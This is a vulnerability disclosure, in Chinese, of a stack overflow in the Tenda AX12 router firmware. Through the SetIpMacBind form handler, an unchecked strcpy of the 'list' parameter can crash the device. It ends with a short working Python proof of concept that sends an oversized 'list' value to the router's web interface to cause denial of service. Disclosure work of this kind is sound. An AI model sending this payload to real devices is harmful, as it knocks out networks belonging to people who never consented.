## 漏洞描述 ##
设备：Tenda-AX12 V22.03.01.21_CN([https://www.tenda.com.cn/download/detail-3237.html](https://www.tenda.com.cn/download/detail-3237.html))

漏洞类型：栈溢出

攻击效果：拒绝服务

## 漏洞成因 ##
该漏洞为发生在sub_42FDE4函数中的栈溢出漏洞，对应上级接口函数为sub_430124，对应的是处理/goform/SetIpMacBind下的post请求

首先，sub_430124调用了sub_42FFF8函数。

![](.\image\Snipaste_2022-07-30_18-20-26.png)

sub_42FFF8函数中，获取post传入的两个参数bindnum和list，并且会将list值的地址作为sub_42FDE4函数的参数。

![](.\image\Snipaste_2022-07-30_18-28-01.png)



sub_42FDE4，strcpy(v16, v6)，v6就是传入的list参数，而在这一过程中没用任何的长度限制与安全检查，由此攻击者可以通过一串长list造成栈溢出，实现拒绝服务攻击。

![](.\image\Snipaste_2022-07-30_18-33-51.png)



## POC ##

拒绝服务的poc：

```python

import requests
from pwn import *

url = "http://192.168.0.1/goform/SetIpMacBind"
cookie = {"Cookie":"password=1111"}
data = {"bindnum": "1", "list":"\r" + "A" * 1000}


requests.post(url, cookies=cookie, data=data)
```
